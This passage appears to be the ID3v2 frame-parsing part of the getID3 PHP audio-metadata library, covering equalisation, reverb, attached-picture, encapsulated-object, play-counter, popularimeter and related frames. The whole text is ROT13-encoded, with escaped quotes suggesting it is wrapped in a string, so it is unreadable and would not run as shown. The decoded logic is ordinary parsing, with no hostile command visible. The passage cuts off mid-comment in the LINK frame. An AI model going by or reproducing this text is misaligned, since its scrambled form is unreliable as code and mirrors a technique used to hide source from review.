					$cnefrqSenzr['vapqrp']['pragre'] = (obby) fhofge($senzr_vapeqrpesyntf, 3, 1);
					$cnefrqSenzr['ibyhzrpunatr']['pragre'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
					vs ($cnefrqSenzr['vapqrp']['pragre'] === snyfr) {
						$cnefrqSenzr['ibyhzrpunatr']['pragre'] *= -1;
					}
					$senzr_bssfrg += $senzr_olgrfibyhzr;
					$cnefrqSenzr['crnxibyhzr']['pragre'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
					$senzr_bssfrg += $senzr_olgrfibyhzr;
				}
				$cnefrqSenzr['qngn'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
				vs (fgeyra($cnefrqSenzr['qngn']) > 0) {
					$cnefrqSenzr['vapqrp']['onff'] = (obby) fhofge($senzr_vapeqrpesyntf, 2, 1);
					$cnefrqSenzr['ibyhzrpunatr']['onff'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
					vs ($cnefrqSenzr['vapqrp']['onff'] === snyfr) {
						$cnefrqSenzr['ibyhzrpunatr']['onff'] *= -1;
					}
					$senzr_bssfrg += $senzr_olgrfibyhzr;
					$cnefrqSenzr['crnxibyhzr']['onff'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
					$senzr_bssfrg += $senzr_olgrfibyhzr;
				}
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs (($vq3i2_znwbeirefvba >= 4) && ($cnefrqSenzr['senzr_anzr'] == 'RDH2')) { // 4.12  RDH2 Rdhnyvfngvba (2) (VQ3i2.4+ bayl)
			//   Gurer znl or zber guna bar 'RDH2' senzr va rnpu gnt,
			//   ohg bayl bar jvgu gur fnzr vqragvsvpngvba fgevat
			// <Urnqre bs 'Rdhnyvfngvba (2)', VQ: 'RDH2'>
			// Vagrecbyngvba zrgubq  $kk
			//   $00  Onaq
			//   $01  Yvarne
			// Vqragvsvpngvba        <grkg fgevat> $00
			//   Gur sbyybjvat vf gura ercrngrq sbe rirel nqwhfgzrag cbvag
			// Serdhrapl          $kk kk
			// Ibyhzr nqwhfgzrag  $kk kk

			$senzr_bssfrg = 0;
			$senzr_vagrecbyngvbazrgubq = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_vqfgevat = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			vs (beq($senzr_vqfgevat) === 0) {
				$senzr_vqfgevat = '';
			}
			$cnefrqSenzr['qrfpevcgvba'] = $senzr_vqfgevat;
			$senzr_erznvavatqngn = fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra(\"\k00\"));
			juvyr (fgeyra($senzr_erznvavatqngn)) {
				$senzr_serdhrapl = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_erznvavatqngn, 0, 2)) / 2;
				$cnefrqSenzr['qngn'][$senzr_serdhrapl] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_erznvavatqngn, 2, 2), snyfr, gehr);
				$senzr_erznvavatqngn = fhofge($senzr_erznvavatqngn, 4);
			}
			$cnefrqSenzr['vagrecbyngvbazrgubq'] = $senzr_vagrecbyngvbazrgubq;
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba == 3) && ($cnefrqSenzr['senzr_anzr'] == 'RDHN')) || // 4.12  RDHN Rdhnyvfngvba (VQ3i2.3 bayl)
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'RDH'))) {     // 4.13  RDH  Rdhnyvfngvba (VQ3i2.2 bayl)
			//   Gurer znl bayl or bar 'RDHN' senzr va rnpu gnt
			// <Urnqre sbe 'Eryngvir ibyhzr nqwhfgzrag', VQ: 'RDH'>
			// Nqwhfgzrag ovgf    $kk
			//   Guvf vf sbyybjrq ol 2 olgrf + ('nqwhfgzrag ovgf' ebhaqrq hc gb gur
			//   arnerfg olgr) sbe rirel rdhnyvfngvba onaq va gur sbyybjvat sbezng,
			//   tvivat n serdhrapl enatr bs 0 - 32767Um:
			// Vaperzrag/qrperzrag   %k (ZFO bs gur Serdhrapl)
			// Serdhrapl             (ybjre 15 ovgf)
			// Nqwhfgzrag            $kk (kk ...)

			$senzr_bssfrg = 0;
			$cnefrqSenzr['nqwhfgzragovgf'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1);
			$senzr_nqwhfgzragolgrf = prvy($cnefrqSenzr['nqwhfgzragovgf'] / 8);

			$senzr_erznvavatqngn = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
			juvyr (fgeyra($senzr_erznvavatqngn) > 0) {
				$senzr_serdhraplfge = trgvq3_yvo::OvtRaqvna2Ova(fhofge($senzr_erznvavatqngn, 0, 2));
				$senzr_vapqrp    = (obby) fhofge($senzr_serdhraplfge, 0, 1);
				$senzr_serdhrapl = ovaqrp(fhofge($senzr_serdhraplfge, 1, 15));
				$cnefrqSenzr[$senzr_serdhrapl]['vapqrp'] = $senzr_vapqrp;
				$cnefrqSenzr[$senzr_serdhrapl]['nqwhfgzrag'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_erznvavatqngn, 2, $senzr_nqwhfgzragolgrf));
				vs ($cnefrqSenzr[$senzr_serdhrapl]['vapqrp'] === snyfr) {
					$cnefrqSenzr[$senzr_serdhrapl]['nqwhfgzrag'] *= -1;
				}
				$senzr_erznvavatqngn = fhofge($senzr_erznvavatqngn, 2 + $senzr_nqwhfgzragolgrf);
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'EIEO')) || // 4.13  EIEO Erireo
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'ERI'))) {     // 4.14  ERI  Erireo
			//   Gurer znl bayl or bar 'EIEO' senzr va rnpu gnt.
			// <Urnqre sbe 'Erireo', VQ: 'EIEO'>
			// Erireo yrsg (zf)                 $kk kk
			// Erireo evtug (zf)                $kk kk
			// Erireo obhaprf, yrsg             $kk
			// Erireo obhaprf, evtug            $kk
			// Erireo srrqonpx, yrsg gb yrsg    $kk
			// Erireo srrqonpx, yrsg gb evtug   $kk
			// Erireo srrqonpx, evtug gb evtug  $kk
			// Erireo srrqonpx, evtug gb yrsg   $kk
			// Cerzvk yrsg gb evtug             $kk
			// Cerzvk evtug gb yrsg             $kk

			$senzr_bssfrg = 0;
			$cnefrqSenzr['yrsg']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 2));
			$senzr_bssfrg += 2;
			$cnefrqSenzr['evtug'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 2));
			$senzr_bssfrg += 2;
			$cnefrqSenzr['obhaprfY']      = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['obhaprfE']      = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['srrqonpxYY']    = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['srrqonpxYE']    = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['srrqonpxEE']    = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['srrqonpxEY']    = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['cerzvkYE']      = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['cerzvkEY']      = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'NCVP')) || // 4.14  NCVP Nggnpurq cvpgher
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'CVP'))) {     // 4.15  CVP  Nggnpurq cvpgher
			//   Gurer znl or frireny cvpgherf nggnpurq gb bar svyr,
			//   rnpu va gurve vaqvivqhny 'NCVP' senzr, ohg bayl bar
			//   jvgu gur fnzr pbagrag qrfpevcgbe
			// <Urnqre sbe 'Nggnpurq cvpgher', VQ: 'NCVP'>
			// Grkg rapbqvat      $kk
			// VQ3i2.3+ => ZVZR glcr          <grkg fgevat> $00
			// VQ3i2.2  => Vzntr sbezng       $kk kk kk
			// Cvpgher glcr       $kk
			// Qrfpevcgvba        <grkg fgevat nppbeqvat gb rapbqvat> $00 (00)
			// Cvpgher qngn       <ovanel qngn>

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$senzr_grkgrapbqvat_grezvangbe = $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat);
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
				$senzr_grkgrapbqvat_grezvangbe = \"\k00\";
			}

			$senzr_vzntrglcr = ahyy;
			$senzr_zvzrglcr = ahyy;
			vs ($vq3i2_znwbeirefvba == 2 && fgeyra($cnefrqSenzr['qngn']) > $senzr_bssfrg) {
				$senzr_vzntrglcr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 3);
				vs (fgegbybjre($senzr_vzntrglcr) == 'vzn') {
					// pbzcyrgr unpx sbe zc3Entr (jjj.punbgvpfbsgjner.pbz) gung chgf VQ3i2.3-sbeznggrq
					// ZVZR glcr vafgrnq bs 3-pune VQ3i2.2-sbezng vzntr glcr  (gunaxf koubssØcnporyy*arg)
					$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
					$senzr_zvzrglcr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
					vs (beq($senzr_zvzrglcr) === 0) {
						$senzr_zvzrglcr = '';
					}
					$senzr_vzntrglcr = fgegbhccre(fge_ercynpr('vzntr/', '', fgegbybjre($senzr_zvzrglcr)));
					vs ($senzr_vzntrglcr == 'WCRT') {
						$senzr_vzntrglcr = 'WCT';
					}
					$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");
				} ryfr {
					$senzr_bssfrg += 3;
				}
			}
			vs ($vq3i2_znwbeirefvba > 2 && fgeyra($cnefrqSenzr['qngn']) > $senzr_bssfrg) {
				$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
				$senzr_zvzrglcr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
				vs (beq($senzr_zvzrglcr) === 0) {
					$senzr_zvzrglcr = '';
				}
				$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");
			}

			$senzr_cvpgherglcr = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));

			vs ($senzr_bssfrg >= $cnefrqSenzr['qngnyratgu']) {
				$guvf->jneavat('qngn cbegvba bs NCVP senzr vf zvffvat ng bssfrg '.($cnefrqSenzr['qngnbssfrg'] + 8 + $senzr_bssfrg));
			} ryfr {
				$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe, $senzr_bssfrg);
				vs (beq(fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe), 1)) === 0) {
					$senzr_grezvangbecbf++; // fgecbf() sbbyrq orpnhfr 2aq olgr bs Havpbqr punef ner bsgra 0k00
				}
				$cnefrqSenzr['qrfpevcgvba']   = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
				$cnefrqSenzr['qrfpevcgvba']   = $guvf->ZnxrHGS16rzcglFgevatRzcgl($cnefrqSenzr['qrfpevcgvba']);
				$cnefrqSenzr['rapbqvatvq']    = $senzr_grkgrapbqvat;
				$cnefrqSenzr['rapbqvat']      = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);

				vs ($vq3i2_znwbeirefvba == 2) {
					$cnefrqSenzr['vzntrglcr'] = vffrg($senzr_vzntrglcr) ? $senzr_vzntrglcr : ahyy;
				} ryfr {
					$cnefrqSenzr['zvzr']      = vffrg($senzr_zvzrglcr) ? $senzr_zvzrglcr : ahyy;
				}
				$cnefrqSenzr['cvpgherglcrvq'] = $senzr_cvpgherglcr;
				$cnefrqSenzr['cvpgherglcr']   = $guvf->NCVPCvpgherGlcrYbbxhc($senzr_cvpgherglcr);
				$cnefrqSenzr['qngn']          = fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe));
				$cnefrqSenzr['qngnyratgu']    = fgeyra($cnefrqSenzr['qngn']);

				$cnefrqSenzr['vzntr_zvzr']    = '';
				$vzntrvasb = neenl();
				vs ($vzntrpuhaxpurpx = trgvq3_yvo::TrgQngnVzntrFvmr($cnefrqSenzr['qngn'], $vzntrvasb)) {
					vs (($vzntrpuhaxpurpx[2] >= 1) && ($vzntrpuhaxpurpx[2] <= 3)) {
						$cnefrqSenzr['vzntr_zvzr']       = vzntr_glcr_gb_zvzr_glcr($vzntrpuhaxpurpx[2]);
						vs ($vzntrpuhaxpurpx[0]) {
							$cnefrqSenzr['vzntr_jvqgu']  = $vzntrpuhaxpurpx[0];
						}
						vs ($vzntrpuhaxpurpx[1]) {
							$cnefrqSenzr['vzntr_urvtug'] = $vzntrpuhaxpurpx[1];
						}
					}
				}

				qb {
					vs ($guvf->trgvq3->bcgvba_fnir_nggnpuzragf === snyfr) {
						// fxvc ragveryl
						hafrg($cnefrqSenzr['qngn']);
						oernx;
					}
					$qve = '';
					vs ($guvf->trgvq3->bcgvba_fnir_nggnpuzragf === gehr) {
						// terng
/*
					} ryfrvs (vf_vag($guvf->trgvq3->bcgvba_fnir_nggnpuzragf)) {
						vs ($guvf->trgvq3->bcgvba_fnir_nggnpuzragf < $cnefrqSenzr['qngn_yratgu']) {
							// gbb ovt, fxvc
							$guvf->jneavat('nggnpuzrag ng '.$senzr_bssfrg.' vf gbb ynetr gb cebprff vayvar ('.ahzore_sbezng($cnefrqSenzr['qngn_yratgu']).' olgrf)');
							hafrg($cnefrqSenzr['qngn']);
							oernx;
						}
*/
					} ryfrvs (vf_fgevat($guvf->trgvq3->bcgvba_fnir_nggnpuzragf)) {
						$qve = egevz(fge_ercynpr(neenl('/', '\\'), QVERPGBEL_FRCNENGBE, $guvf->trgvq3->bcgvba_fnir_nggnpuzragf), QVERPGBEL_FRCNENGBE);
						vs (!vf_qve($qve) || !trgVQ3::vf_jevgnoyr($qve)) {
							// pnaabg jevgr, fxvc
							$guvf->jneavat('nggnpuzrag ng '.$senzr_bssfrg.' pnaabg or fnirq gb \"'.$qve.'\" (abg jevgnoyr)');
							hafrg($cnefrqSenzr['qngn']);
							oernx;
						}
					}
					// vs jr trg guvf sne, zhfg or BX
					vs (vf_fgevat($guvf->trgvq3->bcgvba_fnir_nggnpuzragf)) {
						$qrfgvangvba_svyranzr = $qve.QVERPGBEL_FRCNENGBE.zq5($vasb['svyranzrcngu']).'_'.$senzr_bssfrg;
						vs (!svyr_rkvfgf($qrfgvangvba_svyranzr) || trgVQ3::vf_jevgnoyr($qrfgvangvba_svyranzr)) {
							svyr_chg_pbagragf($qrfgvangvba_svyranzr, $cnefrqSenzr['qngn']);
						} ryfr {
							$guvf->jneavat('nggnpuzrag ng '.$senzr_bssfrg.' pnaabg or fnirq gb \"'.$qrfgvangvba_svyranzr.'\" (abg jevgnoyr)');
						}
						$cnefrqSenzr['qngn_svyranzr'] = $qrfgvangvba_svyranzr;
						hafrg($cnefrqSenzr['qngn']);
					} ryfr {
						vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && !rzcgl($cnefrqSenzr['qngn'])) {
							vs (!vffrg($vasb['vq3i2']['pbzzragf']['cvpgher'])) {
								$vasb['vq3i2']['pbzzragf']['cvpgher'] = neenl();
							}
							$pbzzragf_cvpgher_qngn = neenl();
							sbernpu (neenl('qngn', 'vzntr_zvzr', 'vzntr_jvqgu', 'vzntr_urvtug', 'vzntrglcr', 'cvpgherglcr', 'qrfpevcgvba', 'qngnyratgu') nf $cvpgher_xrl) {
								vs (vffrg($cnefrqSenzr[$cvpgher_xrl])) {
									$pbzzragf_cvpgher_qngn[$cvpgher_xrl] = $cnefrqSenzr[$cvpgher_xrl];
								}
							}
							$vasb['vq3i2']['pbzzragf']['cvpgher'][] = $pbzzragf_cvpgher_qngn;
							hafrg($pbzzragf_cvpgher_qngn);
						}
					}
				} juvyr (snyfr); // @cucfgna-vtaber-yvar
			}

		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'TRBO')) || // 4.15  TRBO Trareny rapncfhyngrq bowrpg
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'TRB'))) {     // 4.16  TRB  Trareny rapncfhyngrq bowrpg
			//   Gurer znl or zber guna bar 'TRBO' senzr va rnpu gnt,
			//   ohg bayl bar jvgu gur fnzr pbagrag qrfpevcgbe
			// <Urnqre sbe 'Trareny rapncfhyngrq bowrpg', VQ: 'TRBO'>
			// Grkg rapbqvat          $kk
			// ZVZR glcr              <grkg fgevat> $00
			// Svyranzr               <grkg fgevat nppbeqvat gb rapbqvat> $00 (00)
			// Pbagrag qrfpevcgvba    <grkg fgevat nppbeqvat gb rapbqvat> $00 (00)
			// Rapncfhyngrq bowrpg    <ovanel qngn>

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$senzr_grkgrapbqvat_grezvangbe = $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat);
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
				$senzr_grkgrapbqvat_grezvangbe = \"\k00\";
			}
			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_zvzrglcr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			vs (beq($senzr_zvzrglcr) === 0) {
				$senzr_zvzrglcr = '';
			}
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe, $senzr_bssfrg);
			vs (beq(fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe), 1)) === 0) {
				$senzr_grezvangbecbf++; // fgecbf() sbbyrq orpnhfr 2aq olgr bs Havpbqr punef ner bsgra 0k00
			}
			$senzr_svyranzr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			vs (beq($senzr_svyranzr) === 0) {
				$senzr_svyranzr = '';
			}
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe);

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe, $senzr_bssfrg);
			vs (beq(fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe), 1)) === 0) {
				$senzr_grezvangbecbf++; // fgecbf() sbbyrq orpnhfr 2aq olgr bs Havpbqr punef ner bsgra 0k00
			}
			$cnefrqSenzr['qrfpevcgvba'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			$cnefrqSenzr['qrfpevcgvba'] = $guvf->ZnxrHGS16rzcglFgevatRzcgl($cnefrqSenzr['qrfpevcgvba']);
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe);

			$cnefrqSenzr['bowrpgqngn']  = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
			$cnefrqSenzr['rapbqvatvq']  = $senzr_grkgrapbqvat;
			$cnefrqSenzr['rapbqvat']    = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);

			$cnefrqSenzr['zvzr']        = $senzr_zvzrglcr;
			$cnefrqSenzr['svyranzr']    = $senzr_svyranzr;
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'CPAG')) || // 4.16  CPAG Cynl pbhagre
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'PAG'))) {     // 4.17  PAG  Cynl pbhagre
			//   Gurer znl bayl or bar 'CPAG' senzr va rnpu gnt.
			//   Jura gur pbhagre ernpurf nyy bar'f, bar olgr vf vafregrq va
			//   sebag bs gur pbhagre guhf znxvat gur pbhagre rvtug ovgf ovttre
			// <Urnqre sbe 'Cynl pbhagre', VQ: 'CPAG'>
			// Pbhagre        $kk kk kk kk (kk ...)

			$cnefrqSenzr['qngn']          = trgvq3_yvo::OvtRaqvna2Vag($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'CBCZ')) || // 4.17  CBCZ Cbchynevzrgre
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'CBC'))) {    // 4.18  CBC  Cbchynevzrgre
			//   Gurer znl or zber guna bar 'CBCZ' senzr va rnpu gnt,
			//   ohg bayl bar jvgu gur fnzr rznvy nqqerff
			// <Urnqre sbe 'Cbchynevzrgre', VQ: 'CBCZ'>
			// Rznvy gb hfre   <grkg fgevat> $00
			// Engvat          $kk
			// Pbhagre         $kk kk kk kk (kk ...)

			$senzr_bssfrg = 0;
			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_rznvynqqerff = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			vs (beq($senzr_rznvynqqerff) === 0) {
				$senzr_rznvynqqerff = '';
			}
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");
			$senzr_engvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['pbhagre'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg));
			$cnefrqSenzr['rznvy']   = $senzr_rznvynqqerff;
			$cnefrqSenzr['engvat']  = $senzr_engvat;
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'EOHS')) || // 4.18  EOHS Erpbzzraqrq ohssre fvmr
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'OHS'))) {     // 4.19  OHS  Erpbzzraqrq ohssre fvmr
			//   Gurer znl bayl or bar 'EOHS' senzr va rnpu gnt
			// <Urnqre sbe 'Erpbzzraqrq ohssre fvmr', VQ: 'EOHS'>
			// Ohssre fvmr               $kk kk kk
			// Rzorqqrq vasb synt        %0000000k
			// Bssfrg gb arkg gnt        $kk kk kk kk

			$senzr_bssfrg = 0;
			$cnefrqSenzr['ohssrefvmr'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 3));
			$senzr_bssfrg += 3;

			$senzr_rzorqqrqvasbsyntf = trgvq3_yvo::OvtRaqvna2Ova(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['syntf']['rzorqrqvasb'] = (obby) fhofge($senzr_rzorqqrqvasbsyntf, 7, 1);
			$cnefrqSenzr['arkggntbssfrg'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs (($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'PEZ')) { // 4.20  Rapelcgrq zrgn senzr (VQ3i2.2 bayl)
			//   Gurer znl or zber guna bar 'PEZ' senzr va n gnt,
			//   ohg bayl bar jvgu gur fnzr 'bjare vqragvsvre'
			// <Urnqre sbe 'Rapelcgrq zrgn senzr', VQ: 'PEZ'>
			// Bjare vqragvsvre      <grkgfgevat> $00 (00)
			// Pbagrag/rkcynangvba   <grkgfgevat> $00 (00)
			// Rapelcgrq qngnoybpx   <ovanel qngn>

			$senzr_bssfrg = 0;
			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_bjarevq = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$cnefrqSenzr['qrfpevcgvba'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			$cnefrqSenzr['qrfpevcgvba'] = $guvf->ZnxrHGS16rzcglFgevatRzcgl($cnefrqSenzr['qrfpevcgvba']);
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");

			$cnefrqSenzr['bjarevq']     = $senzr_bjarevq;
			$cnefrqSenzr['qngn']        = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'NRAP')) || // 4.19  NRAP Nhqvb rapelcgvba
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'PEN'))) {     // 4.21  PEN  Nhqvb rapelcgvba
			//   Gurer znl or zber guna bar 'NRAP' senzrf va n gnt,
			//   ohg bayl bar jvgu gur fnzr 'Bjare vqragvsvre'
			// <Urnqre sbe 'Nhqvb rapelcgvba', VQ: 'NRAP'>
			// Bjare vqragvsvre   <grkg fgevat> $00
			// Cerivrj fgneg      $kk kk
			// Cerivrj yratgu     $kk kk
			// Rapelcgvba vasb    <ovanel qngn>

			$senzr_bssfrg = 0;
			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_bjarevq = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			vs (beq($senzr_bjarevq) === 0) {
				$senzr_bjarevq = '';
			}
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");
			$cnefrqSenzr['bjarevq'] = $senzr_bjarevq;
			$cnefrqSenzr['cerivrjfgneg'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 2));
			$senzr_bssfrg += 2;
			$cnefrqSenzr['cerivrjyratgu'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 2));
			$senzr_bssfrg += 2;
			$cnefrqSenzr['rapelcgvbavasb'] = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'YVAX')) || // 4.20  YVAX Yvaxrq vasbezngvba
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'YAX'))) {    // 4.22  YAX  Yvaxrq vasbezngvba
			//   Gurer znl or zber guna bar 'YVAX' senzr va n gnt,
			//   ohg bayl bar jvgu gur fnzr pbagragf
			// <Urnqre sbe 'Yvaxrq vasbezngvba', VQ: 'YVAX'>
			// VQ3i2.3+ => Senzr vqragvsvre   $kk kk kk kk
			// VQ3i2.2  => Senzr vqragvsvre   $kk kk kk
			// HEY                            <grkg fgevat> $00
